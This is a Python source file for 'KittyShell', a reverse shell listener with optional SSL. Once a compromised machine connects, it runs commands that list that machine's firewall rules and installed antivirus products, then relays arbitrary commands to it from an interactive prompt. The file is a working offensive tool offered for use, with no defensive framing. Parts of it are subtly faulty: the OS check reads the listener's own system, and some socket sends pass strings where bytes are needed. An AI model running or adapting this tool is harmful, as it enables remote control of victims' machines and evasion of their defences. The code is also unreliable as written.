#!/usr/bin/env python3

import socket
import ssl
import sys
import argparse
import threading
import platform
from colorama import init, Fore, Style

init()

class SecurityDetector:
    @staticmethod
    def detect_firewall(client):
        commands = {
            'windows': [
                'netsh advfirewall show allprofiles',
                'netsh advfirewall firewall show rule name=all'
            ],
            'linux': [
                'iptables -L',
                'ufw status',
                'firewall-cmd --list-all'
            ]
        }
        
        system = platform.system().lower()
        if system not in commands:
            return "Unknown system type"
            
        results = []
        for cmd in commands[system]:
            try:
                client.send(f"cmd /c {cmd}" if system == 'windows' else cmd)
                response = client.recv(4096).decode()
                results.append(response)
            except:
                continue
                
        return "\n".join(results)

    @staticmethod
    def detect_security_software(client):
        commands = {
            'windows': [
                'tasklist | findstr /i "avast avg defender mcafee norton"',
                'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname',
                'Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled'
            ],
            'linux': [
                'ps aux | grep -i "clamav|avast|avg|mcafee|norton"',
                'systemctl list-units | grep -i "antivirus|security|firewall"',
                'rpm -qa | grep -i "clamav|avast|avg|mcafee|norton"'
            ]
        }
        
        system = platform.system().lower()
        if system not in commands:
            return "Unknown system type"
            
        results = []
        for cmd in commands[system]:
            try:
                client.send(f"cmd /c {cmd}" if system == 'windows' else cmd)
                response = client.recv(4096).decode()
                results.append(response)
            except:
                continue
                
        return "\n".join(results)

class KittyShell:
    def __init__(self, host="0.0.0.0", port=4444, use_ssl=False, cert_file="cert.pem", key_file="key.pem"):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.cert_file = cert_file
        self.key_file = key_file
        self.socket = None
        self.client = None
        self.security_detector = SecurityDetector()
        
    def setup_listener(self):
        """Setup and start the reverse shell listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            
            print(f"{Fore.GREEN}[+] Listening on {self.host}:{self.port}{Style.RESET_ALL}")
            
            if self.use_ssl:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
                self.socket = context.wrap_socket(self.socket, server_side=True)
                
            self.client, addr = self.socket.accept()
            print(f"{Fore.GREEN}[+] Connection received from {addr[0]}{Style.RESET_ALL}")
            
            self.perform_security_checks()
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error setting up listener: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)
            
    def perform_security_checks(self):
        print(f"{Fore.YELLOW}[*] Performing security checks...{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[*] Checking firewall status...{Style.RESET_ALL}")
        firewall_status = self.security_detector.detect_firewall(self.client)
        print(f"{Fore.YELLOW}[+] Firewall Status:{Style.RESET_ALL}\n{firewall_status}")
        
        print(f"{Fore.CYAN}[*] Checking security software...{Style.RESET_ALL}")
        security_status = self.security_detector.detect_security_software(self.client)
        print(f"{Fore.YELLOW}[+] Security Software Status:{Style.RESET_ALL}\n{security_status}")
            
    def handle_client(self):
        while True:
            try:
                command = input(f"{Fore.CYAN}kittyshell> {Style.RESET_ALL}")
                
                if command.lower() == "exit":
                    break
                    
                if command.lower() == "check_firewall":
                    firewall_status = self.security_detector.detect_firewall(self.client)
                    print(f"{Fore.YELLOW}[+] Firewall Status:{Style.RESET_ALL}\n{firewall_status}")
                    continue
                    
                if command.lower() == "check_security":
                    security_status = self.security_detector.detect_security_software(self.client)
                    print(f"{Fore.YELLOW}[+] Security Software Status:{Style.RESET_ALL}\n{security_status}")
                    continue
                    
                if command:
                    self.client.send(command.encode())
                    response = self.client.recv(4096).decode()
                    print(response)
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error handling client: {str(e)}{Style.RESET_ALL}")
                break
                
        self.cleanup()
        
    def cleanup(self):
        if self.client:
            self.client.close()
        if self.socket:
            self.socket.close()
            
def main():
    parser = argparse.ArgumentParser(description="KittyShell - Reverse Shell Listener")
    parser.add_argument("-i", "--host", default="0.0.0.0", help="Host IP address to listen on")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Port to listen on")
    parser.add_argument("-s", "--ssl", action="store_true", help="Enable SSL encryption")
    parser.add_argument("--cert", default="cert.pem", help="Path to SSL certificate file")
    parser.add_argument("--key", default="key.pem", help="Path to SSL private key file")
    
    args = parser.parse_args()
    
    print(f"""{Fore.MAGENTA}
                              ≽^•⩊•^≼
██╗  ██╗██╗████████╗████████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
██║ ██╔╝██║╚══██╔══╝╚══██╔══╝╚██╗ ██╔╝██╔════╝██║  ██║██╔════╝██║     ██║     
█████╔╝ ██║   ██║      ██║    ╚████╔╝ ███████╗███████║█████╗  ██║     ██║     
██╔═██╗ ██║   ██║      ██║     ╚██╔╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██╗██║   ██║      ██║      ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                              
    {Style.RESET_ALL}""")
    
    print(f"{Fore.YELLOW}[*] Starting KittyShell...{Style.RESET_ALL}")
    
    shell = KittyShell(args.host, args.port, args.ssl, args.cert, args.key)
    shell.setup_listener()
    shell.handle_client()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Keyboard interrupt received. Exiting...{Style.RESET_ALL}")
        sys.exit(0) 